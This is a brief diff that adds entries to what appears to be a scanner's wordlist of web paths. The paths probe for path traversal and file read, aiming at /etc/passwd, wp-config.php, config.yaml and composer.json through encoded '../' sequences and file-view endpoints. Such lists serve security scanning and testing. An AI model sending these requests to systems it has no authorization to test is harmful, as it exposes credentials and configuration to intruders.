@@ -729,3 +729,9 @@
 /?hippoo_serve=../../../../wp-config.php
 /workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 /api/v1/chatflows
+/dashboard%2e%2e/data/config.yaml
+/api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
+/api/v1/repos/search?limit=1
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
+/cache/original/%2e%2e/composer.json
